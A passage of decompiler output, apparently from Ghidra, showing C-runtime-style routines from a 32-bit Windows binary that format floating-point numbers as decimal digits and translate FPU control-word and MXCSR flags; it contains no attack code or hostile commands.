LAB_0041ad9e:
      iVar6 = FUN_0040bcd6((char *)(param_6 + 2),0x16,pcVar26);
      psVar15 = extraout_EDX_01;
      if (iVar6 != 0) {
        FUN_0040c91a();
        psVar15 = extraout_EDX_02;
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    iVar6 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    goto LAB_0041b53b;
  }
  local_50 = (short)(((uVar14 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar14 * 0x4d10
                    >> 0x10);
  uVar16 = (uint)local_50;
  local_24._0_2_ = 0;
  local_1a = (undefined)uVar14;
  bStack_19 = (byte)(uVar14 >> 8);
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  local_24._2_2_ = (ushort)param_1;
  local_68 = &LAB_00423680;
  uStack_20 = uStack_12;
  if (-uVar16 != 0) {
    iVar4 = param_1;
    uVar14 = -uVar16;
    iVar6 = iVar3;
    if (0 < (int)uVar16) {
      local_68 = &DAT_004237e0;
      uVar14 = uVar16;
    }
    while (uVar14 != 0) {
      uStack_20 = (ushort)((uint)iVar4 >> 0x10);
      local_24._2_2_ = (ushort)iVar4;
      iVar3 = CONCAT22(local_c,local_10._2_2_);
      local_68 = local_68 + 0x54;
      if ((uVar14 & 7) != 0) {
        piVar10 = (int *)(local_68 + (uVar14 & 7) * 0xc);
        if (0x7fff < *(ushort *)piVar10) {
          local_40 = (undefined2)*piVar10;
          uStack_3e._0_2_ = (undefined2)((uint)*piVar10 >> 0x10);
          piVar2 = piVar10 + 2;
          uStack_3e._2_2_ = (undefined2)piVar10[1];
          uStack_3a = (ushort)((uint)piVar10[1] >> 0x10);
          piVar10 = (int *)&local_40;
          local_38 = *piVar2;
          iVar6 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
          uStack_3e._0_2_ = (undefined2)iVar6;
          uStack_3e._2_2_ = (undefined2)((uint)iVar6 >> 0x10);
        }
        local_58 = 0;
        local_14 = 0;
        uStack_13 = 0;
        uStack_12 = 0;
        local_10._0_2_ = 0;
        iVar21 = 0;
        local_10._2_2_ = 0;
        local_c = 0;
        iVar3 = 0;
        uStack_a = 0;
        uVar19 = (*(ushort *)((int)piVar10 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
        uVar9 = CONCAT11(bStack_19,local_1a) & 0x7fff;
        uVar13 = *(ushort *)((int)piVar10 + 10) & 0x7fff;
        uVar20 = uVar13 + uVar9;
        if (((uVar9 < 0x7fff) && (uVar13 < 0x7fff)) && (uVar20 < 0xbffe)) {
          if (0x3fbf < uVar20) {
            if (((uVar9 == 0) &&
                (uVar20 = uVar20 + 1,
                (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
               ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
              local_1a = 0;
              bStack_19 = 0;
              goto LAB_0041b0af;
            }
            if ((((uVar13 == 0) && (uVar20 = uVar20 + 1, (piVar10[2] & 0x7fffffffU) == 0)) &&
                (piVar10[1] == 0)) && (*piVar10 == 0)) goto LAB_0041aece;
            local_5c = 0;
            puVar25 = &local_10;
            local_44 = 5;
            do {
              local_54 = local_44;
              if (0 < local_44) {
                local_70 = (ushort *)((int)&local_24 + local_5c * 2);
                local_6c = piVar10 + 2;
                do {
                  bVar5 = false;
                  uVar16 = puVar25[-1] + (uint)*local_70 * (uint)*(ushort *)local_6c;
                  if ((uVar16 < (uint)puVar25[-1]) ||
                     (uVar16 < (uint)*local_70 * (uint)*(ushort *)local_6c)) {
                    bVar5 = true;
                  }
                  puVar25[-1] = uVar16;
                  if (bVar5) {
                    *(short *)puVar25 = *(short *)puVar25 + 1;
                  }
                  local_70 = local_70 + 1;
                  local_6c = (int *)((int)local_6c + -2);
                  local_54 = local_54 + -1;
                } while (0 < local_54);
              }
              puVar25 = (undefined4 *)((int)puVar25 + 2);
              local_5c = local_5c + 1;
              local_44 = local_44 + -1;
            } while (0 < local_44);
            uVar20 = uVar20 + 0xc002;
            if ((short)uVar20 < 1) {
LAB_0041afdf:
              uVar20 = uVar20 - 1;
              if ((short)uVar20 < 0) {
                uVar16 = (uint)(ushort)-uVar20;
                uVar20 = 0;
                do {
                  if ((local_14 & 1) != 0) {
                    local_58 = local_58 + 1;
                  }
                  iVar3 = CONCAT22(uStack_a,local_c);
                  uVar22 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
                  local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                  uStack_a = uStack_a >> 1;
                  local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
                  uVar23 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                  uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                  uVar16 = uVar16 - 1;
                  local_10._0_2_ = (ushort)(uVar22 >> 1);
                  local_14 = (byte)uVar23;
                  uStack_13 = (undefined)(uVar23 >> 8);
                } while (uVar16 != 0);
                if (local_58 != 0) {
                  local_14 = local_14 | 1;
                }
              }
            }
            else {
              do {
                uVar13 = local_10._2_2_;
                uVar9 = uStack_12;
                if ((uStack_a & 0x8000) != 0) break;
                iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
                local_14 = (byte)iVar21;
                uStack_13 = (undefined)((uint)iVar21 >> 8);
                uStack_12 = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
                local_10._0_2_ = (ushort)iVar21 | uVar9 >> 0xf;
                local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar21 = CONCAT22(uStack_a,local_c) * 2;
                local_c = (ushort)iVar21 | uVar13 >> 0xf;
                uVar20 = uVar20 - 1;
                uStack_a = (ushort)((uint)iVar21 >> 0x10);
              } while (0 < (short)uVar20);
              if ((short)uVar20 < 1) goto LAB_0041afdf;
            }
            if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
               (iVar3 = CONCAT22(local_c,local_10._2_2_),
               iVar21 = CONCAT22((ushort)local_10,uStack_12),
               (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
              if (CONCAT22((ushort)local_10,uStack_12) == -1) {
                uStack_12 = 0;
                local_10._0_2_ = 0;
                iVar21 = 0;
                if (CONCAT22(local_c,local_10._2_2_) == -1) {
                  local_10._2_2_ = 0;
                  local_c = 0;
                  if (uStack_a == 0xffff) {
                    uStack_a = 0x8000;
                    uVar20 = uVar20 + 1;
                    iVar3 = 0;
                    iVar21 = 0;
                  }
                  else {
                    uStack_a = uStack_a + 1;
                    iVar3 = 0;
                    iVar21 = 0;
                  }
                }
                else {
                  iVar3 = CONCAT22(local_c,local_10._2_2_) + 1;
                  local_10._2_2_ = (ushort)iVar3;
                  local_c = (ushort)((uint)iVar3 >> 0x10);
                }
              }
              else {
                iVar21 = CONCAT22((ushort)local_10,uStack_12) + 1;
                uStack_12 = (ushort)iVar21;
                local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
                iVar3 = CONCAT22(local_c,local_10._2_2_);
              }
            }
            local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_12 = (ushort)iVar21;
            local_c = (ushort)((uint)iVar3 >> 0x10);
            local_10._2_2_ = (ushort)iVar3;
            if (uVar20 < 0x7fff) {
              bStack_19 = (byte)(uVar20 >> 8) | (byte)(uVar19 >> 8);
              local_24._0_2_ = uStack_12;
              local_24._2_2_ = (ushort)local_10;
              uStack_20 = local_10._2_2_;
              iVar4 = CONCAT22(local_10._2_2_,(ushort)local_10);
              uStack_1e = local_c;
              uStack_1c = uStack_a;
              local_1a = (undefined)uVar20;
            }
            else {
              uStack_20 = 0;
              uStack_1e = 0;
              local_24._0_2_ = 0;
              local_24._2_2_ = 0;
              iVar4 = 0;
              iVar11 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
              uStack_1c = (ushort)iVar11;
              local_1a = (undefined)((uint)iVar11 >> 0x10);
              bStack_19 = (byte)((uint)iVar11 >> 0x18);
            }
            goto LAB_0041b0af;
          }
LAB_0041aece:
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
        }
        else {
          iVar21 = ((uVar19 == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
        }
        uStack_20 = 0;
        uStack_1e = 0;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar4 = 0;
        iVar21 = 0;
        iVar3 = 0;
      }
LAB_0041b0af:
      uStack_20 = (ushort)((uint)iVar4 >> 0x10);
      local_24._2_2_ = (ushort)iVar4;
      local_c = (ushort)((uint)iVar3 >> 0x10);
      local_10._2_2_ = (ushort)iVar3;
      local_10._0_2_ = (ushort)((uint)iVar21 >> 0x10);
      uStack_12 = (ushort)iVar21;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar14 = (int)uVar14 >> 3;
    }
  }
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_24._2_2_ = (ushort)param_1;
  uVar14 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  if (0x3ffe < (ushort)(uVar14 >> 0x10)) {
    local_50 = local_50 + 1;
    local_54 = 0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    local_c = 0;
    uStack_a = 0;
    uVar16 = uVar14 >> 0x10 & 0x7fff;
    iVar21 = uVar16 + 0x3ffb;
    if (((ushort)uVar16 < 0x7fff) && ((ushort)iVar21 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar21) {
        if (((((ushort)uVar16 == 0) &&
             (iVar21 = uVar16 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          param_2 = 0;
          uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
          goto LAB_0041b373;
        }
        local_5c = 0;
        puVar25 = &local_10;
        local_44 = 5;
        do {
          local_58 = local_44;
          if (0 < local_44) {
            local_4c = (ushort *)&local_2c;
            puVar7 = (ushort *)((int)&local_24 + local_5c * 2);
            do {
              bVar5 = false;
              uVar16 = puVar25[-1] + (uint)*local_4c * (uint)*puVar7;
              if ((uVar16 < (uint)puVar25[-1]) || (uVar16 < (uint)*local_4c * (uint)*puVar7)) {
                bVar5 = true;
              }
              puVar25[-1] = uVar16;
              if (bVar5) {
                *(short *)puVar25 = *(short *)puVar25 + 1;
              }
              local_4c = local_4c + -1;
              puVar7 = puVar7 + 1;
              local_58 = local_58 + -1;
            } while (0 < local_58);
          }
          puVar25 = (undefined4 *)((int)puVar25 + 2);
          local_5c = local_5c + 1;
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar21 = iVar21 + 0xc002;
        if ((short)iVar21 < 1) {
LAB_0041b26c:
          uVar20 = (ushort)(iVar21 + 0xffff);
          if ((short)uVar20 < 0) {
            uVar16 = -(iVar21 + 0xffff);
            uVar14 = uVar16 & 0xffff;
            uVar20 = uVar20 + (short)uVar16;
            do {
              if ((local_14 & 1) != 0) {
                local_54 = local_54 + 1;
              }
              iVar3 = CONCAT22(uStack_a,local_c);
              uVar16 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
              uVar22 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar14 = uVar14 - 1;
              local_10._0_2_ = (ushort)(uVar16 >> 1);
              local_14 = (byte)uVar22;
              uStack_13 = (undefined)(uVar22 >> 8);
            } while (uVar14 != 0);
            if (local_54 != 0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar9 = local_10._2_2_;
            uVar20 = uStack_12;
            if ((short)uStack_a < 0) break;
            iVar3 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar3;
            uStack_13 = (undefined)((uint)iVar3 >> 8);
            uStack_12 = (ushort)((uint)iVar3 >> 0x10);
            iVar3 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar3 | uVar20 >> 0xf;
            local_10._2_2_ = (ushort)((uint)iVar3 >> 0x10);
            iVar3 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar3 | uVar9 >> 0xf;
            iVar21 = iVar21 + 0xffff;
            uStack_a = (ushort)((uint)iVar3 >> 0x10);
          } while (0 < (short)iVar21);
          uVar20 = (ushort)iVar21;
          if ((short)uVar20 < 1) goto LAB_0041b26c;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), uVar16 = CONCAT22((ushort)local_10,uStack_12)
           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            uVar16 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar20 = uVar20 + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                uVar16 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            uVar16 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)(uVar16 >> 0x10);
        uStack_12 = (ushort)uVar16;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar20 < 0x7fff) {
          bStack_19 = (byte)(uVar20 >> 8) | bStack_19 & 0x80;
          uStack_20 = local_10._2_2_;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar20;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          uVar16 = 0;
          iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar21;
          local_1a = (undefined)((uint)iVar21 >> 0x10);
          bStack_19 = (byte)((uint)iVar21 >> 0x18);
          param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        }
        goto LAB_0041b373;
      }
      iVar21 = 0;
    }
    else {
      iVar21 = (((bStack_19 & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;
    }
    uStack_1e = 0;
    uStack_20 = 0;
    uStack_1c = (ushort)iVar21;
    local_1a = (undefined)((uint)iVar21 >> 0x10);
    bStack_19 = (byte)((uint)iVar21 >> 0x18);
    param_2 = 0;
    uVar16 = 0;
  }
LAB_0041b373:
  *param_6 = local_50;
  psVar15 = param_6;
  if (((param_5 & 1) == 0) || (param_4 = param_4 + local_50, 0 < param_4)) {
    if (0x15 < param_4) {
      param_4 = 0x15;
    }
    iVar21 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 0x10) - 0x3ffe;
    local_1a = 0;
    bStack_19 = 0;
    local_48 = 8;
    uVar14 = uVar16;
    do {
      uVar16 = uVar14 << 1;
      iVar3 = CONCAT22(uStack_1e,uStack_20) * 2;
      uStack_20 = (ushort)iVar3 | (ushort)(uVar14 >> 0x1f);
      iVar4 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2;
      uStack_1c = (ushort)iVar4 | uStack_1e >> 0xf;
      local_48 = local_48 + -1;
      uStack_1e = (ushort)((uint)iVar3 >> 0x10);
      local_1a = (undefined)((uint)iVar4 >> 0x10);
      bStack_19 = (byte)((uint)iVar4 >> 0x18);
      uVar14 = uVar16;
    } while (local_48 != 0);
    if ((iVar21 < 0) && (uVar22 = -iVar21 & 0xff, uVar22 != 0)) {
      do {
        iVar3 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
        uVar23 = CONCAT22(uStack_1e,uStack_20);
        iVar21 = CONCAT22(uStack_1e,uStack_20);
        uVar16 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) >> 1;
        uStack_1c = (ushort)uVar16;
        local_1a = (undefined)(uVar16 >> 0x10);
        bStack_19 = bStack_19 >> 1;
        uStack_1e = uStack_1e >> 1 | (ushort)((uint)(iVar3 << 0x1f) >> 0x10);
        uVar16 = uVar14 >> 1 | iVar21 << 0x1f;
        uVar22 = uVar22 - 1;
        uStack_20 = (ushort)(uVar23 >> 1);
        local_24._0_2_ = (undefined2)(uVar14 >> 1);
        local_24._2_2_ = (ushort)(uVar16 >> 0x10);
        uVar14 = CONCAT22(local_24._2_2_,(undefined2)local_24);
      } while (0 < (int)uVar22);
    }
    psVar1 = param_6 + 2;
    psVar17 = psVar1;
    uVar20 = uStack_1e;
    for (iVar21 = param_4 + 1; 0 < iVar21; iVar21 = iVar21 + -1) {
      local_24._2_2_ = (ushort)(uVar16 >> 0x10);
      local_24._0_2_ = (undefined2)uVar16;
      iVar6 = CONCAT22(uStack_20,local_24._2_2_);
      local_38 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
      uVar14 = CONCAT22(uVar20,uStack_20) * 2;
      uVar22 = (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) * 2 | (uint)(uVar20 >> 0xf)) * 2 |
               uVar14 >> 0x1f;
      uVar23 = (uVar14 | local_24._2_2_ >> 0xf) * 2 | (uVar16 << 1) >> 0x1f;
      uVar14 = uVar16 * 5;
      if ((uVar14 < uVar16 * 4) || (uVar24 = uVar23, uVar14 < uVar16)) {
        uVar24 = uVar23 + 1;
        bVar5 = false;
        if ((uVar24 < uVar23) || (uVar24 == 0)) {
          bVar5 = true;
        }
        if (bVar5) {
          uVar22 = uVar22 + 1;
        }
      }
      uVar23 = CONCAT22(uVar20,uStack_20) + uVar24;
      if ((uVar23 < uVar24) || (uVar23 < CONCAT22(uVar20,uStack_20))) {
        uVar22 = uVar22 + 1;
      }
      psVar15 = (short *)(uVar23 >> 0x1f);
      iVar3 = (uVar22 + local_38) * 2;
      uStack_1c = (ushort)iVar3 | (ushort)(uVar23 >> 0x1f);
      uVar16 = uVar16 * 10;
      local_1a = (undefined)((uint)iVar3 >> 0x10);
      uStack_20 = (ushort)(uVar23 * 2) | (ushort)(uVar14 >> 0x1f);
      *(char *)psVar17 = (char)((uint)iVar3 >> 0x18) + '0';
      psVar17 = (short *)((int)psVar17 + 1);
      uStack_1e = (ushort)(uVar23 * 2 >> 0x10);
      bStack_19 = 0;
      local_40 = (undefined2)local_24;
      uStack_3a = uVar20;
      uVar20 = uStack_1e;
    }
    psVar18 = psVar17 + -1;
    uStack_1e = uVar20;
    if (*(char *)((int)psVar17 + -1) < '5') {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '0'));
          psVar18 = (short *)((int)psVar18 + -1)) {
      }
      if (psVar18 < psVar1) {
        *param_6 = 0;
        *(undefined *)((int)param_6 + 3) = 1;
        uVar14 = CONCAT31(0x80,(uVar8 != 0x8000) + -1) & 0xffffff0d;
        cVar12 = (char)uVar14 + ' ';
        psVar15 = (short *)CONCAT31((int3)(uVar14 >> 8),cVar12);
        *(char *)(param_6 + 1) = cVar12;
        *(char *)psVar1 = '0';
        *(undefined *)((int)param_6 + 5) = 0;
        goto LAB_0041b53b;
      }
    }
    else {
      for (; (psVar1 <= psVar18 && (*(char *)psVar18 == '9'));
          psVar18 = (short *)((int)psVar18 + -1)) {
        *(char *)psVar18 = '0';
      }
      if (psVar18 < psVar1) {
        psVar18 = (short *)((int)psVar18 + 1);
        *param_6 = *param_6 + 1;
      }
      *(char *)psVar18 = *(char *)psVar18 + '\x01';
    }
    cVar12 = ((char)psVar18 - (char)param_6) + -3;
    *(char *)((int)param_6 + 3) = cVar12;
    *(undefined *)(cVar12 + 4 + (int)param_6) = 0;
  }
  else {
    *param_6 = 0;
    *(undefined *)((int)param_6 + 3) = 1;
    *(byte *)(param_6 + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
  }
LAB_0041b53b:
  uStack_3e = iVar6;
  local_24 = uVar16;
  local_10 = param_2;
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,psVar15);
  return;
}



uint FUN_0041b587(void)

{
  uint uVar1;
  uint uVar2;
  uint unaff_EBX;
  
  uVar1 = (uint)((unaff_EBX & 0x10) != 0);
  if ((unaff_EBX & 8) != 0) {
    uVar1 = uVar1 | 4;
  }
  if ((unaff_EBX & 4) != 0) {
    uVar1 = uVar1 | 8;
  }
  if ((unaff_EBX & 2) != 0) {
    uVar1 = uVar1 | 0x10;
  }
  if ((unaff_EBX & 1) != 0) {
    uVar1 = uVar1 | 0x20;
  }
  if ((unaff_EBX & 0x80000) != 0) {
    uVar1 = uVar1 | 2;
  }
  uVar2 = unaff_EBX & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x400;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x800;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0xc00;
    }
  }
  if ((unaff_EBX & 0x30000) == 0) {
    uVar1 = uVar1 | 0x300;
  }
  else if ((unaff_EBX & 0x30000) == 0x10000) {
    uVar1 = uVar1 | 0x200;
  }
  if ((unaff_EBX & 0x40000) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  return uVar1;
}



uint __fastcall FUN_0041b615(undefined4 param_1,uint param_2)

{
  uint uVar1;
  uint uVar2;
  
  uVar1 = 0;
  if ((param_2 & 0x10) != 0) {
    uVar1 = 0x80;
  }
  if ((param_2 & 8) != 0) {
    uVar1 = uVar1 | 0x200;
  }
  if ((param_2 & 4) != 0) {
    uVar1 = uVar1 | 0x400;
  }
  if ((param_2 & 2) != 0) {
    uVar1 = uVar1 | 0x800;
  }
  if ((param_2 & 1) != 0) {
    uVar1 = uVar1 | 0x1000;
  }
  if ((param_2 & 0x80000) != 0) {
    uVar1 = uVar1 | 0x100;
  }
  uVar2 = param_2 & 0x300;
  if (uVar2 != 0) {
    if (uVar2 == 0x100) {
      uVar1 = uVar1 | 0x2000;
    }
    else if (uVar2 == 0x200) {
      uVar1 = uVar1 | 0x4000;
    }
    else if (uVar2 == 0x300) {
      uVar1 = uVar1 | 0x6000;
    }
  }
  uVar2 = param_2 & 0x3000000;
  if (uVar2 == 0x1000000) {
    uVar1 = uVar1 | 0x8040;
  }
  else {
    if (uVar2 == 0x2000000) {
      return uVar1 | 0x40;
    }
    if (uVar2 == 0x3000000) {
      return uVar1 | 0x8000;
    }
  }
  return uVar1;
}



uint __cdecl FUN_0041b6b5(uint param_1,uint param_2)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  ushort in_FPUControlWord;
  
  uVar5 = 0;
  if ((in_FPUControlWord & 1) != 0) {
    uVar5 = 0x10;
  }
  if ((in_FPUControlWord & 4) != 0) {
    uVar5 = uVar5 | 8;
  }
  if ((in_FPUControlWord & 8) != 0) {
    uVar5 = uVar5 | 4;
  }
  if ((in_FPUControlWord & 0x10) != 0) {
    uVar5 = uVar5 | 2;
  }
  if ((in_FPUControlWord & 0x20) != 0) {
    uVar5 = uVar5 | 1;
  }
  if ((in_FPUControlWord & 2) != 0) {
    uVar5 = uVar5 | 0x80000;
  }
  uVar1 = in_FPUControlWord & 0xc00;
  if ((in_FPUControlWord & 0xc00) != 0) {
    if (uVar1 == 0x400) {
      uVar5 = uVar5 | 0x100;
    }
    else if (uVar1 == 0x800) {
      uVar5 = uVar5 | 0x200;
    }
    else if (uVar1 == 0xc00) {
      uVar5 = uVar5 | 0x300;
    }
  }
  if ((in_FPUControlWord & 0x300) == 0) {
    uVar5 = uVar5 | 0x20000;
  }
  else if ((in_FPUControlWord & 0x300) == 0x200) {
    uVar5 = uVar5 | 0x10000;
  }
  if ((in_FPUControlWord & 0x1000) != 0) {
    uVar5 = uVar5 | 0x40000;
  }
  uVar2 = ~param_2 & uVar5 | param_1 & param_2;
  if (uVar2 != uVar5) {
    uVar5 = FUN_0041b587();
    uVar2 = 0;
    if ((uVar5 & 1) != 0) {
      uVar2 = 0x10;
    }
    if ((uVar5 & 4) != 0) {
      uVar2 = uVar2 | 8;
    }
    if ((uVar5 & 8) != 0) {
      uVar2 = uVar2 | 4;
    }
    if ((uVar5 & 0x10) != 0) {
      uVar2 = uVar2 | 2;
    }
    if ((uVar5 & 0x20) != 0) {
      uVar2 = uVar2 | 1;
    }
    if ((uVar5 & 2) != 0) {
      uVar2 = uVar2 | 0x80000;
    }
    uVar3 = uVar5 & 0xc00;
    if (uVar3 != 0) {
      if (uVar3 == 0x400) {
        uVar2 = uVar2 | 0x100;
      }
      else if (uVar3 == 0x800) {
        uVar2 = uVar2 | 0x200;
      }
      else if (uVar3 == 0xc00) {
        uVar2 = uVar2 | 0x300;
      }
    }
    if ((uVar5 & 0x300) == 0) {
      uVar2 = uVar2 | 0x20000;
    }
    else if ((uVar5 & 0x300) == 0x200) {
      uVar2 = uVar2 | 0x10000;
    }
    if ((uVar5 & 0x1000) != 0) {
      uVar2 = uVar2 | 0x40000;
    }
  }
  uVar5 = 0;
  if (DAT_00425778 != 0) {
    if ((char)MXCSR < '\0') {
      uVar5 = 0x10;
    }
    if ((MXCSR & 0x200) != 0) {
      uVar5 = uVar5 | 8;
    }
    if ((MXCSR & 0x400) != 0) {
      uVar5 = uVar5 | 4;
    }
    if ((MXCSR & 0x800) != 0) {
      uVar5 = uVar5 | 2;
    }
    if ((MXCSR & 0x1000) != 0) {
      uVar5 = uVar5 | 1;
    }
    if ((MXCSR & 0x100) != 0) {
      uVar5 = uVar5 | 0x80000;
    }
    uVar3 = MXCSR & 0x6000;
    if (uVar3 != 0) {
      if (uVar3 == 0x2000) {
        uVar5 = uVar5 | 0x100;
      }
      else if (uVar3 == 0x4000) {
        uVar5 = uVar5 | 0x200;
      }
      else if (uVar3 == 0x6000) {
        uVar5 = uVar5 | 0x300;
      }
    }
    uVar4 = MXCSR & 0x8040;
    if (uVar4 == 0x40) {
      uVar5 = uVar5 | 0x2000000;
    }
    else if (uVar4 == 0x8000) {
      uVar5 = uVar5 | 0x3000000;
    }
    else if (uVar4 == 0x8040) {
      uVar5 = uVar5 | 0x1000000;
    }
    uVar4 = ~(param_2 & 0x308031f) & uVar5 | param_2 & 0x308031f & param_1;
    if (uVar4 != uVar5) {
      FUN_0041b615(uVar3,uVar4);
      FUN_0041bb92();
      uVar5 = 0;
      if ((char)MXCSR < '\0') {
        uVar5 = 0x10;
      }
      if ((MXCSR & 0x200) != 0) {
        uVar5 = uVar5 | 8;
      }
      if ((MXCSR & 0x400) != 0) {
        uVar5 = uVar5 | 4;
      }
      if ((MXCSR & 0x800) != 0) {
        uVar5 = uVar5 | 2;
      }
      if ((MXCSR & 0x1000) != 0) {
        uVar5 = uVar5 | 1;
      }
      if ((MXCSR & 0x100) != 0) {
        uVar5 = uVar5 | 0x80000;
      }
      uVar3 = MXCSR & 0x6000;
      if (uVar3 != 0) {
        if (uVar3 == 0x2000) {
          uVar5 = uVar5 | 0x100;
        }
        else if (uVar3 == 0x4000) {
          uVar5 = uVar5 | 0x200;
        }
        else if (uVar3 == 0x6000) {
          uVar5 = uVar5 | 0x300;
        }
      }
      uVar3 = MXCSR & 0x8040;
      if (uVar3 == 0x40) {
        uVar5 = uVar5 | 0x2000000;
      }
      else if (uVar3 == 0x8000) {
        uVar5 = uVar5 | 0x3000000;
      }
      else if (uVar3 == 0x8040) {
        uVar5 = uVar5 | 0x1000000;
      }
    }
    uVar3 = uVar5 ^ uVar2;
    uVar2 = uVar5 | uVar2;
    if ((uVar3 & 0x8031f) != 0) {
      uVar2 = uVar2 | 0x80000000;
    }
  }
  return uVar2;
}



void __fastcall
FUN_0041b9c4(undefined4 param_1,uint param_2,char *param_3,int param_4,uint *param_5)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  short sVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  
  uVar7 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  sVar6 = 0x404e;
  *param_5 = 0;
  param_5[1] = 0;
  param_5[2] = 0;
  if (param_4 != 0) {
    do {
      uVar2 = *param_5;
      uVar10 = *param_5;
      uVar1 = param_5[1];
      uVar11 = param_5[2];
      uVar9 = param_5[1] * 2;
      bVar4 = false;
